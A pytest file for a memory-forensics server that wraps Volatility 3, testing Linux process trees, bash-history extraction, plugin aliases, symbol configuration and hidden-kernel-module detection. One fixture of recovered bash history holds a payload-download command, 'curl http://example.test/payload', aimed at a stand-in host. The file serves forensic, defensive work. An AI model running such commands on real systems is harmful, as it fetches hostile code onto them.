import asyncio
import json
import os
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from mem_forensics_mcp import server as server_module
from mem_forensics_mcp.analyzers.command_history import get_command_history
from mem_forensics_mcp.analyzers.process_analyzer import get_process_tree
from mem_forensics_mcp.core.plugin_runner import _normalize_plugin_name
from mem_forensics_mcp.core.session import MemorySession, clear_sessions
from mem_forensics_mcp.core.vol3_runner import Vol3Runner
from mem_forensics_mcp.engine.memoxide_client import MemoxideClient


class StructuredLinuxSession:
    def __init__(self, image_path, plugin_results):
        self.image_path = Path(image_path)
        self.profile = {"os": "Linux", "kernel": "5.10.0-test-amd64"}
        self.os_type = "linux"
        self.plugin_results = plugin_results
        self.calls = []

    def initialize(self):
        return {"ready": True, "structured_ready": True, "os_type": "linux"}

    def structured_analysis_error(self, operation, supported_os=None):
        return None

    def run_plugin(self, plugin, **kwargs):
        self.calls.append((plugin, kwargs))
        return self.plugin_results[plugin]

    def readiness(self):
        return {
            "ready": True,
            "session_ready": True,
            "raw_ready": False,
            "structured_ready": True,
            "os_type": "linux",
            "capabilities": ["structured_plugins"],
            "warnings": [],
        }


def test_linux_process_tree_uses_linux_pslist_and_normalizes_fields(tmp_path):
    session = StructuredLinuxSession(tmp_path / "memory.lime", {
        "linux.pslist.PsList": [
            {"PID": 1, "PPID": 0, "COMM": "systemd", "CREATION TIME": "t0"},
            {"PID": 13608, "PPID": 1, "COMM": "bash", "CREATION TIME": "t1"},
            {"PID": 38687, "PPID": 1, "COMM": "dnsmasq", "CREATION TIME": "t2"},
        ],
    })

    with (
        patch("mem_forensics_mcp.analyzers.process_analyzer.VOL3_AVAILABLE", True),
        patch("mem_forensics_mcp.analyzers.process_analyzer.get_session", return_value=session),
    ):
        result = get_process_tree(str(session.image_path))

    assert session.calls == [("linux.pslist.PsList", {})]
    assert result["os_type"] == "linux"
    assert result["plugin"] == "linux.pslist.PsList"
    assert result["total_processes"] == 3
    assert result["trees"][0]["pid"] == 1
    children = {child["pid"]: child for child in result["trees"][0]["children"]}
    assert children[13608] == {
        "pid": 13608,
        "ppid": 1,
        "name": "bash",
        "create_time": "t1",
        "depth": 1,
        "children": [],
    }
    assert children[38687]["name"] == "dnsmasq"


def test_linux_command_history_uses_bash_plugin_and_preserves_timestamp(tmp_path):
    session = StructuredLinuxSession(tmp_path / "memory.lime", {
        "linux.bash.Bash": [
            {
                "PID": 13608,
                "Process": "bash",
                "CommandTime": "2025-08-20T10:20:30+00:00",
                "Command": "curl http://example.test/payload",
            },
        ],
    })

    with (
        patch("mem_forensics_mcp.analyzers.command_history.VOL3_AVAILABLE", True),
        patch("mem_forensics_mcp.analyzers.command_history.get_session", return_value=session),
    ):
        result = get_command_history(
            str(session.image_path),
            pid=13608,
            include_benign=True,
        )

    assert session.calls == [("linux.bash.Bash", {"pid": [13608]})]
    assert result["os_type"] == "linux"
    assert result["commands_found"] == 1
    assert result["commands"][0]["pid"] == 13608
    assert result["commands"][0]["timestamp"] == "2025-08-20T10:20:30+00:00"
    assert result["commands"][0]["command"].startswith("curl ")


@pytest.mark.parametrize(
    ("requested", "normalized"),
    [
        ("linux.pagecache.Files", "linux.pagecache.Files"),
        ("linux.pagecache.InodePages", "linux.pagecache.InodePages"),
        (
            "linux.malware.hidden_modules",
            "linux.malware.hidden_modules.Hidden_modules",
        ),
        ("linux.lsmod", "linux.lsmod.Lsmod"),
        ("linux.sockstat", "linux.sockstat.Sockstat"),
        ("pslist", "linux.pslist.PsList"),
    ],
)
def test_linux_plugin_aliases(requested, normalized):
    assert _normalize_plugin_name(requested, "linux") == normalized


def test_nested_linux_plugin_class_resolves(tmp_path):
    image = tmp_path / "memory.raw"
    image.write_bytes(b"RAW0")
    runner = Vol3Runner(image, os_hint="linux")

    plugin_class = runner._get_plugin_class(
        "linux.malware.hidden_modules.Hidden_modules"
    )

    assert plugin_class is not None
    assert plugin_class.__name__ == "Hidden_modules"


def test_session_passes_symbol_configuration_to_volatility(tmp_path):
    image = tmp_path / "memory.lime"
    image.write_bytes(b"EMiL" + (b"\x00" * 64))
    symbols_root = tmp_path / "symbols"
    symbols_root.mkdir()
    isf_path = symbols_root / "5.10.0-test-amd64.json"
    isf_path.write_text("{}")
    session = MemorySession(image)
    session.configure_symbols(symbols_root=symbols_root, isf_path=isf_path)
    session.set_rust_session("rust-linux", None, metadata={"virtual_memory": False})

    class FakeRunner:
        def __init__(self, image_path, symbols_root=None, isf_path=None, os_hint=None):
            assert Path(image_path) == image
            assert Path(symbols_root) == symbols_root_path
            assert Path(isf_path) == isf_path_expected
            assert os_hint == "linux"
            self.is_initialized = False
            self.os_type = "linux"
            self.structured_ready = False

        def initialize(self):
            self.is_initialized = True
            self.structured_ready = True
            return {
                "os": "Linux",
                "kernel_banner": "Linux version 5.10.0-test-amd64",
                "symbols_loaded": True,
            }

    symbols_root_path = symbols_root
    isf_path_expected = isf_path
    with patch("mem_forensics_mcp.core.session.Vol3Runner", FakeRunner):
        assert session.ensure_vol3_initialized() is True

    assert session.structured_ready is True
    assert session.profile["os"] == "Linux"
    assert session.symbol_dirs == [str(symbols_root)]


def test_invalid_symbol_paths_are_actionable(tmp_path):
    session = MemorySession(tmp_path / "memory.raw")
    with pytest.raises(ValueError, match="Symbols root is not a directory"):
        session.configure_symbols(symbols_root=tmp_path / "missing")


def test_public_analyze_schema_exposes_symbol_inputs():
    tools = asyncio.run(server_module.list_tools())
    analyze = next(tool for tool in tools if tool.name == "memory_analyze_image")
    properties = analyze.inputSchema["properties"]
    assert "symbols_root" in properties
    assert "isf_path" in properties


def test_memoxide_receives_explicit_isf_not_symbols_root():
    client = object.__new__(MemoxideClient)
    client.call_tool = AsyncMock(return_value={"session_id": "rust-session"})

    result = asyncio.run(client.analyze_image(
        "/evidence/memory.raw",
        symbols_root="/symbols/root",
        isf_path="/symbols/kernel.json",
    ))

    assert result == {"session_id": "rust-session"}
    client.call_tool.assert_awaited_once_with(
        "memory_analyze_image",
        {
            "image_path": "/evidence/memory.raw",
            "isf_path": "/symbols/kernel.json",
        },
    )


def test_fast_rust_banner_probe_ignores_format_string_and_keeps_real_banner():
    generic = b"prefix\x00Linux version %s (%s)\x00suffix"
    expected = (
        b"Linux version 5.10.0-35-amd64 (debian-kernel@lists.debian.org) "
        b"#1 SMP Debian 5.10.237-1 (2025-05-19)"
    )
    raw_result = {
        "matches": [
            {"context_hex": generic.hex()},
            {"context_hex": (b"prefix\x00" + expected + b"\x00suffix").hex()},
        ],
    }
    session = MemorySession("/tmp/memory.lime")
    session.set_rust_session("rust-linux", None, metadata={"virtual_memory": False})

    with patch.object(
        server_module,
        "_try_rust_plugin",
        new=AsyncMock(return_value=raw_result),
    ):
        detected = asyncio.run(server_module._detect_linux_banner_with_rust(session))

    assert detected is True
    readiness = session.readiness()
    assert readiness["kernel_banner"] == expected.decode("latin-1")
    assert readiness["expected_isf"] == "5.10.0-35-amd64.json.xz"


@pytest.mark.skipif(
    not (os.environ.get("MEM_TEST_IMAGE") and os.environ.get("MEM_TEST_ISF")),
    reason="Set MEM_TEST_IMAGE and MEM_TEST_ISF for Linux artifact integration",
)
def test_linux_artifact_with_matching_isf():
    image = os.environ["MEM_TEST_IMAGE"]
    isf = os.environ["MEM_TEST_ISF"]
    clear_sessions()

    def decode(contents):
        return json.loads(contents[0].text)

    analyzed = decode(asyncio.run(server_module.call_tool(
        "memory_analyze_image",
        {"image_path": image, "isf_path": isf},
    )))
    assert analyzed["os_type"] == "linux"
    assert analyzed["structured_ready"] is True

    tree = decode(asyncio.run(server_module.call_tool(
        "memory_get_process_tree",
        {"image_path": image},
    )))

    def flatten(nodes):
        for node in nodes:
            yield node
            yield from flatten(node.get("children", []))

    processes = {node["pid"]: node for node in flatten(tree["trees"])}
    assert processes[13608]["name"] == "bash"
    assert processes[38687]["name"] == "dnsmasq"

    history = decode(asyncio.run(server_module.call_tool(
        "memory_get_command_history",
        {"image_path": image, "pid": 13608, "include_benign": True},
    )))
    assert history["commands_found"] > 0

    hidden = decode(asyncio.run(server_module.call_tool(
        "memory_run_plugin",
        {
            "image_path": image,
            "plugin": "linux.malware.hidden_modules",
            "filter": "Nullincrevenge",
        },
    )))
    assert hidden.get("result_count", 0) > 0 or hidden.get("results")
